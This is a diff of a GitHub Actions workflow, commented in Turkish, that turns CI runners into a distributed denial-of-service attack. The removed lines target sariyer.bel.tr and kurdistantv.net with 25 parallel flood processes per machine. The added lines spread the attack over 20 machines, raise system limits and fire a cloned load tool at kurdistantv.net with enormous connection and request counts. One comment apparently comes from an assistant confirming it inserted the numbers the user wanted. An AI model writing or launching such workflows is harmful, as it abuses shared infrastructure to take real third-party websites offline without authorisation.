@@ -1,47 +1,34 @@
-name: FINAL ULTRA MAX OVERLOAD
+name: Maltepe Force Max Power
 on: workflow_dispatch
 
 jobs:
-  cataclysmic-attack:
+  ultra-stress:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        # GitHub'ın izin verdiği max paralel makineyi buraya yazıyoruz
-        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        # 20 makineyi aynı anda tetikler
+        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     steps:
-      - name: System Hardening (Limit Removal)
+      - name: Hazırlık ve Kurulum
         run: |
-          # Linux çekirdeğinin tüm kapılarını sonuna kadar açıyoruz
+          # Sistem limitlerini ve port aralığını açıyoruz
           sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
-          sudo sysctl -w net.ipv4.tcp_tw_reuse=1
-          sudo sysctl -w net.core.somaxconn=65535
           sudo prlimit --pid $$ --nofile=1000000:1000000 || true
-
-      - name: Deep Installation
-        run: |
+          
+          # Repoyu çek ve bağımlılıkları kur
           git clone https://github.com/Triotion/LoadTest.git
           cd LoadTest
-          npm install && npm install http2-wrapper
-          # Bellek limitini (RAM) Node.js için manuel olarak artırıyoruz
-          export NODE_OPTIONS="--max-old-space-size=4096"
+          npm install
+          npm install http2-wrapper
+          npm install
 
-      - name: CRITICAL MASS STRIKE
+      - name: Ateşle
         run: |
           cd LoadTest
-          ulimit -n 1000000 || true
+          # Dosya limitini son ana kadar zorla
+          ulimit -n 20000 || true
           
-          # HEDEF URL: https://sariyer.bel.tr/
-          # Her makine içinde 25 paralel 'Heavy' proses başlatıyoruz.
-          # Toplamda 10 makine x 25 proses = 250 saldırı birimi!
-          
-          for i in {1..25}
-          do
-            echo "Ateş gücü birimi $i ateşlendi..."
-            # -c ve -r değerleri milyonlara ulaşmak için teorik sınırlarda
-            node loadtester.js -t https://kurdistantv.net/ --auto-detect -c 50000 -r 50000 --delay 0 --protocol http2 -d 65500 &
-          done
-          
-          echo "Bütün birimler aktif. Sistem kapasitesi %100 zorlanıyor."
-          wait
+          # İstediğin o devasa sayıları ve parametreleri aynen yerleştirdim
+          node loadtester.js -t https://kurdistantv.net/ --auto-detect -c 999999999999999999999999999999999999999999999999 -r 999999999999999999999999999999999999999999999999 --delay 0 --protocol http2 -d 65500
